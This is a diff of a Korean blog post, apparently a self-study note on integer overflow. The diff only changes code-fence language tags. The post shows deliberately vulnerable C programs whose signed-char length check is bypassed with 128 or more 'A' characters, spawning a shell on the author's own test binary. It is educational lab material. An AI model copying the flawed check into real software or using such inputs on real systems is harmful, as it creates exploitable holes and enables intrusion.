@@ -29,7 +29,7 @@
 
 그래서 바이너리를 직접 만들어봤다.
 
-```
+```c
 fkillrra@ubuntu  ~/Study/Integer_overflow  vi argc_overflow.c
 1 #include <stdio.h>
 2 
@@ -42,13 +42,13 @@ fkillrra@ubuntu  ~/Study/Integer_overflow  vi argc_overflow.c
 
 이렇게 만든 바이너리를 m32 옵션을 주어 gcc 로 컴파일 하였다.
 
-```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -m32 -o argc_overflow argc_overflow.c
 ```
 
 이렇게 컴파일이 완료된 바이너리에 integer overflow를 시도해보았다.
 
-```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  ./argc_overflow `python -c 'print "\x00"*2147483647'`
 Traceback (most recent call last):
   File "<string>", line 1, in <module>
@@ -118,8 +118,10 @@ int 형의 범위는 아래와 같다.
 
 그래서 필자는 아래와 같은 바이너리를 하나 만들어 줬다.
 
-```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  vi int.c
+```
+```c
   1 #include <stdio.h>
   2 
   3 int main()
@@ -129,6 +131,8 @@ fkillrra@ubuntu  ~/Study/Integer_overflow  vi int.c
   7     printf("int max + 1 : %d\n", test+1);
   8     return 0;
   9 }
+```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -o int int.c 
 fkillrra@ubuntu  ~/Study/Integer_overflow  ./int 
 int max : 2147483647
@@ -153,8 +157,10 @@ int max + 1 : -2147483648
 
 먼저 간단한 예제를 살펴보자.
 
-```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  vi vuln.c
+```
+```c
   1 #include <stdio.h>
   2 #include <string.h>
   3 
@@ -174,6 +180,8 @@ fkillrra@ubuntu  ~/Study/Integer_overflow  vi vuln.c
  17 
  18     return 0;
  19 }
+```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  gcc -o vuln vuln.c 
 fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln `python -c 'print "A"*40'`
 Error! Max size : 30
@@ -183,7 +191,7 @@ Error! Max size : 30
 
 그러나 signed char는 128 이상의 수를 음수로 인식하므로 문자열을 128개 이상 입력했을 때 if 문을 통과할 수 있다.
 
-```
+```bash
  fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln `python -c 'print "A"*130'`
 Vuln!
 *** stack smashing detected ***: ./vuln terminated
@@ -219,7 +227,7 @@ stack smashing 이 떳지만 Vuln! 이 출력되는 것을 보아 if문을 통�
 
 [Vuln_example.c]
 
-```
+```c
   1 #include <stdio.h>
   2 #include <string.h>
   3 
@@ -261,7 +269,7 @@ stack smashing 이 떳지만 Vuln! 이 출력되는 것을 보아 if문을 통�
 
 먼저 char 는 overflow 가 128일때 나타나기 때문에 이 만큼의 문자열을 넣어주면 깔끔하게 쉘을 띄울 수 있다.
 
-```
+```bash
 fkillrra@ubuntu  ~/Study/Integer_overflow  ./vuln_example `python -c 'print "A"*128'`
 I'm 9#
 fkillrra@ubuntu:~/Study/Integer_overflow$ id
